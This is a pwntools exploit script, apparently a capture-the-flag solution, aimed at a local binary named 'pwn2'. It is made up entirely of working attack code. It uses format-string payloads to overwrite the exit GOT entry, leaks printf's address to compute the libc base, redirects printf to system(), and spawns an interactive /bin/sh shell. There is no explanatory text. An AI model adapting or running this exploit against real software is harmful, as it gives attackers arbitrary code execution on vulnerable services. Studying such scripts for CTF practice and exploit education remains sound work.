from pwn import *
context(arch="amd64",os="linux",log_level="debug")
context.terminal = ['tmux','splitw','-h']
p =process(argv=['./pwn2', "a.txt"])
#gdb.attach(p)
elf = ELF("./pwn2")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#libc = ELF("./libc.so.6")
printf_plt=elf.plt["printf"]
printf_got = elf.got["printf"]
exit_got = elf.got["exit"]
strlen_plt = elf.plt["strlen"]
strlen_got = elf.got["strlen"]
main_addr = 0x4009bd
print(hex(strlen_plt),hex(strlen_plt+6))
p.recvuntil("action: ")
payload="e "+"aaaaaa%"+str(main_addr-6)+"s%17$lln"+p64(exit_got)
#print(payload)
p.sendline(payload)
#pause()
p.recvuntil("action: ")
payload="e "+"a%15$s"+p64(printf_got)
p.sendline(payload)
printf_leak = u64(p.recv()[19:25]+'\x00\x00')
print(hex(printf_leak))
libc.address = printf_leak - libc.symbols["printf"]
system_addr =  libc.symbols[ 'system']
bin_addr =  libc.search( '/bin/sh').next()
print(hex(system_addr))
#pause()
payload="e "+"aaaaaa%"+str(system_addr)+"s%18$lln"+p64(printf_got)
p.sendline(payload)
#pause()
#p.recvuntil("action: ")
print("hhhhh")
p.sendline("e /bin/sh\x00")

p.interactive()
